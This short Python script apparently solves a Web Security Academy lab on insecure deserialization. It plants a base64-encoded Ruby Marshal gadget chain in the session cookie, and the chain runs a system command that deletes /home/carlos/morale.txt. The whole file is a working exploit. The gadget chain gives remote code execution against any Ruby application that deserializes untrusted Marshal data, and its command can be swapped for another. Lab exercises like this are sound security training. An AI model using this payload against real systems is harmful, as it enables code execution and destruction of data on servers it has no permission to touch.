from web_security_academy.core.logger import logger
from base64 import b64encode
from urllib.parse import quote


def solve_lab(session):
    # Generated payload from https://bishopfox.com/blog/ruby-vulnerabilities-exploits
    serial = (
        "BAh7BjoMcGF5bG9hZFsIYxVHZW06OlNwZWNGZXRjaGVyYxNHZW06Okluc3RhbGxlclU6FUdlbTo6"
        "UmVxdWlyZW1lbnRbBm86HEdlbTo6UGFja2FnZTo6VGFyUmVhZGVyBjoIQGlvbzoUTmV0OjpCdWZm"
        "ZXJlZElPBzsIbzojR2VtOjpQYWNrYWdlOjpUYXJSZWFkZXI6OkVudHJ5BzoKQHJlYWRpADoMQGhl"
        "YWRlckkiCGFhYQY6BkVUOhJAZGVidWdfb3V0cHV0bzoWTmV0OjpXcml0ZUFkYXB0ZXIHOgxAc29j"
        "a2V0bzoUR2VtOjpSZXF1ZXN0U2V0BzoKQHNldHNvOw8HOxBtC0tlcm5lbDoPQG1ldGhvZF9pZDoL"
        "c3lzdGVtOg1AZ2l0X3NldEkiH3JtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0BjsNVDsTOgxyZXNv"
        "bHZl"
    )

    session.cookies.set("session", quote(serial))
    logger.info("Embedded serialized object as session cookie")

    session.get_path("/")
    logger.info("Visited lab with session cookie")
